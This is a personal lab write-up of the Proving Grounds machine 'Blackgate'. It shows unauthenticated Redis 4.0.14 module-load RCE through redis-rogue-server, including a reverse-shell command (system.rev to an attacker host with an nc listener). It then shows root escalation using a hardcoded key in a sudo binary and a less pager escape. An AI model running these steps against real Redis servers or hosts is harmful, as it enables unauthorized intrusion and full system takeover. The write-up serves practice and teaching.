# Blackgate  (Proving Grounds Practice · Linux · Intermediate)

- **IP:** `<target>`   **Date:** 2026-10-20
- **One-line:** Unauthenticated **Redis 4.0.14** → module-load RCE (`redis-rogue-server`) → `prudence` → `sudo` on a custom `redis-status` ELF that runs **`systemctl status`** as root → **`less` pager escape** (`!/bin/bash`) → root.

---

## 1. Enumeration

```bash
nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt $IP      # only 22, 6379
nmap -p22,6379 -sCV -Pn -oN scans/services.txt $IP
```
| Port | Service | Note |
|---|---|---|
| 22 | OpenSSH | no creds yet → payoff, not a way in |
| **6379** | **Redis 4.0.14** | open, **no auth** → the only way in |

> 🔑 Two ports, SSH useless without creds → **Redis is the entire foothold.** The version **4.0.14** is the tell: Redis **≥ 4.0** supports loading external modules → RCE. (See `[ENUM-REDIS]` / `[VERSION-VULN-MAP]`.)

## 2. Foothold (prudence, uid=1001)

**Vector:** Redis ≥ 4.0 **module-load RCE**. `redis-rogue-server` stands up a rogue master, makes the target replicate from it, and sideloads a malicious `.so` that adds `system.exec` / `system.rev`.

```bash
# redis-rogue-server (github n0b0dyCN/redis-rogue-server)
python3 redis-rogue-server.py --rhost $IP --lhost <KALI>
#   ⚠️ it threw UnicodeDecodeError('gb18030') — a KNOWN cosmetic bug; the module LOADS anyway.
# So just drive it by hand with redis-cli:
redis-cli -h $IP
  MODULE LIST                 # confirm the evil 'system' module is loaded
  system.exec "id"            # → uid=1001(prudence)  = RCE
  system.rev <KALI> 443       # reverse shell (Kali: nc -lvnp 443)
```
Stabilise, then:
- **local.txt:** `[captured]`

## 3. Privilege Escalation (root)

**The breadcrumb:** a root-owned but **world-readable** `notes.txt` planted in prudence's home:
```
[?] Setup redis server
[?] Turn on protected mode
[?] Implementation of the redis-status      ← points straight at the privesc
[?] Allow remote connections to the redis server
```
**The sudo right:**
```bash
sudo -l
#   (root) NOPASSWD: /usr/local/bin/redis-status
```
**Cracking the binary:**
```bash
ls -l /usr/local/bin/redis-status     # -rwxr-xr-x root root → can't edit it
file /usr/local/bin/redis-status      # ELF 64-bit, dynamically linked, NOT STRIPPED
sudo /usr/local/bin/redis-status      # prompts "Authorization Key:" → wrong key = "Incident reported!"
strings /usr/local/bin/redis-status   # not stripped → read its guts:
#   ClimbingParrotKickingDonkey321          ← hardcoded auth key
#   /usr/bin/systemctl status redis         ← runs this as root via system()
```
Logic reconstructed: prompt → `gets()` key → `strcmp()` vs the hardcoded key → if match, `system("/usr/bin/systemctl status redis")`.

**The exploit — `systemctl status` → pager escape (GTFOBins):**
`systemctl` is called by **full path** → no PATH hijack. BUT `systemctl status` in a TTY pipes through the **`less` pager**, which here runs **as root**, and `less` can spawn a shell with `!`. `less` auto-quits if output fits one screen → **shrink the terminal** to keep it open.
```bash
stty rows 5                                  # force systemctl output to overflow → pager stays open
sudo /usr/local/bin/redis-status
#   Authorization Key:  ClimbingParrotKickingDonkey321
#   → drops into less (as root) → type:
!/bin/bash                                   # root shell
id                                           # uid=0(root) 🏆
cat /root/proof.txt
```
- **proof.txt:** `[captured]`

## 4. Learnings & tips
- **A version number is a lead, not trivia.** "Redis 4.0.14" → module-load RCE + the tool name `redis-rogue-server`. This is the exact gap `[VERSION-VULN-MAP]` fills.
- **A root-owned, world-readable file in your home is a planted hint — read it first.** `notes.txt` named the privesc outright.
- **`sudo` a custom binary → ask "what does it run as root, and can I subvert that?"** Not stripped → `strings` leaks the auth key AND the command it runs.
- **`systemctl status` = GTFOBins pager escape.** Any root process that pages through `less`/`more` → `!sh`. Shrink the terminal (`stty rows 5`) so the pager doesn't auto-quit.
- **"Tool threw an error" ≠ "tool failed."** redis-rogue-server's UnicodeDecodeError is cosmetic — the module loaded; verify with `MODULE LIST` before giving up.

## 5. Rabbit holes / mistakes (so I don't repeat them)
- ⚠️ `cat`'d a binary → garbage. Compiled ELF → use `strings` / `file`, not `cat`.
- ⚠️ First `strings` run got typed INTO the program's `Authorization Key:` prompt (it was still waiting on input) → "Wrong key". Run `strings` at the shell prompt, not while the binary is reading stdin.
- ⚠️ Nearly reached for a PATH hijack — defeated here by the **full path** to systemctl + `secure_path` in sudo Defaults. Read the binary first; it showed the full path.
- 💡 The SUID list was all stock snap/system binaries (pkexec present = possible PwnKit backup, but unneeded). The `sudo -l` entry was the intended path.
- 💡 Binary also uses `gets()` → a real buffer-overflow bug (a second path in). Pager escape is cleaner, so took it.

## 6. KB tags used
- `[ENUM-REDIS]` + `[VERSION-VULN-MAP]` (Redis ≥4.0 module RCE, `redis-rogue-server`) · `[SHELL-STABILIZE]` · `[FLAG-HUNT]` · `[LINUX-SUDO]` (sudo custom binary) · `[GTFOBINS-WORKFLOW]` (`systemctl`/pager `!sh`) · `[LINUX-ENUM]` (notes.txt breadcrumb, SUID sweep)
